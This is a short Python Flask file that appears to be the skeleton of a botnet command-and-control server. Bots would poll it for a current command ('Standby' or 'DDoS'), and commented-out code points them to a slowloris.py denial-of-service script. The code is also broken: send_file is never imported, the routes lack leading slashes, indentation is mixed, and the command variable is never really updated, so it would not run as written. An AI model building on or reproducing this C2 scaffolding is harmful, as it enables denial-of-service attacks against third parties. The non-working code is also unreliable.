from flask import Flask, request
import socket
import os

SLPort = "8888"

avail_commands = ["Standby", "DDoS"]

current_command = "Standby"

app = Flask(__name__)

@app.route('/')
def home():
    return "Hello, world"
@app.route('/get_script')
def get_script():
    # for root, dirs, files in os.walk("."):
    #     for name in files:
    #         if name == "ip.txt":
    #             os.remove("ip.txt")
    # string = os.system("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' >> ip.txt")
    
    # f = open("ip.txt")
    # return str(f.readlines()[0] + ":" + SLPort + "/slowloris.py")
    try:
		return send_file('/var/www/PythonProgramming/PythonProgramming/static/images/python.jpg', attachment_filename='python.jpg')
	except Exception as e:
		return str(e)

@app.route('set_action', methods = ['POST'])
def set_action():
    body = request.get_json()
    if "command" in body and body["command"] in avail_commands:
        current_command = body["command"]


@app.route('get_command', methods = ['GET'])
def get_command():
    return current_command


if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0')